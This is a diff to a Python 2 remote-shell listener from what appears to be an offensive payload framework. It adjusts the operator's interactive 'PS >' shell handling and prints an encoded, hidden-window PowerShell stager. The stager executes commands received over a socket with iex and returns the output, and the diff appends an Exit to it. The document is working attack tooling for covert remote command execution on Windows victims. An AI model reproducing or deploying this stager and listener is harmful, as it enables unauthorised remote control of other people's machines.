@@ -6,6 +6,7 @@ import re
 import sys
 import os
 import time
+import select
 from threading import Thread
 from main import *
 from menu import *
@@ -32,7 +33,7 @@ def startBindListener(portnum,useProxy):
     print t.bold_green + "connection from %s %s"%(bindIp, bindPort) + t.normal
 
     if useProxy:
-        subprocess.Popen(['firefox','127.0.0.1:8888'])
+        subprocess.Popen(['firefox','127.0.0.1:8888'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         bindServer, bindServerAddress = bsp.accept()
 
     while bindClient:
@@ -95,6 +96,8 @@ def startClientListener():
 def interactShell(clientconn,clientnumber):
     from menu import clientMenuOptions
     print "Commands\n" + "-"*24 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*24
+    if clientconn in select.select([clientconn], [], [], 0.5)[0]:
+        clientconn.recv(1024)
 
     while True:
         command = raw_input("PS > ")
@@ -118,7 +121,7 @@ def interactShell(clientconn,clientnumber):
             if data == "\x00":
                 data = ''
                 break
-    return True
+    return "clear"
 
 
 def clientUpload(fileToUpload,clientconn,powershellExec,isExe):
@@ -152,10 +155,10 @@ def printListener():
         "if($d.length -gt 0){"
         "$cb = (iex -c $d 2>&1 | Out-String);"
         "$br = $cb + ($error[0] | Out-String) + \"\x00\";$error.clear();"
-        "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);$sl.Flush()}};$c.Close()")
+        "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);$sl.Flush()}};$c.Close();Exit")
 
     print 'powershell.exe -WindowStyle Hidden -NonInteractive -enc ' + windows_powershell_stager.encode('utf_16_le').encode('base64').replace('\n','')
-    return True
+    return "pass"
 
 def pingClients(clientconn,clientnumber):
     from menu import clientMenuOptions
